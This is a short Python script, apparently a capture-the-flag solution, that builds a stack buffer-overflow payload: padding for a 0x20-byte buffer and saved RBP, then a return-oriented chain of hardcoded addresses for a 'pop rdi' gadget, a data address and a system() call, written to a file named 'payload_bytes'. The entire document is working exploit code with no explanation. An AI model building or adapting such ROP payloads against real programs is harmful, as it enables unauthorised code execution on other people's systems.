
local_buffer = b'A'*0x20
rbp_filler = b'B'*0x8

#stack_align = b"\x3e\x05\x40\x00" + b"\x00"*4
pop_rdi = b"\xc3\x07\x40\x00" + b"\x00"*4
stack_rdi = b"\x60\x10\x60\x00" + b"\x00"*4
system_call = b"\x4b\x07\x40\x00" + b"\x00"*4

rop_chain = local_buffer + rbp_filler + pop_rdi + stack_rdi + system_call

with open("payload_bytes", "wb") as f:
    f.write(rop_chain)